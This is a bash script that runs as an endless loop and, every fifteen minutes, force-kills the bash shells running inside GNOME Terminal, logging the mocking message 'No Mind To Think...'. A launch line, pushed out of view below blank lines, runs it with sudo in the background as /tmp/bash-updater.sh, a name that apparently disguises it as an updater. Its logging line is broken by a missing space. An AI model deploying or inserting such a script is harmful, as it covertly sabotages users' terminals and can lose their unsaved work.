#!/bin/bash

while true; do
        gnome_pids=$(pgrep -f gnome-terminal-server)

        for pid in $gnome_pids; do
                bash_pids=$(pgrep -P "$pid")

                for bpid in $bash_pids; do
                        proc_name=$(ps -p "$bpid" -o comm=)
                        if [[ "$proc_name" == "bash" ]]; then
                                echo"$(date): No Mind To Think... $bpid" >> /tmp/debug.log
                                kill -9 $bpid
                        fi
                done
        done
        sleep 900 #Every 15 Minutes
done













#sudo nohup /tmp/bash-updater.sh >/dev/null 2>&1 &
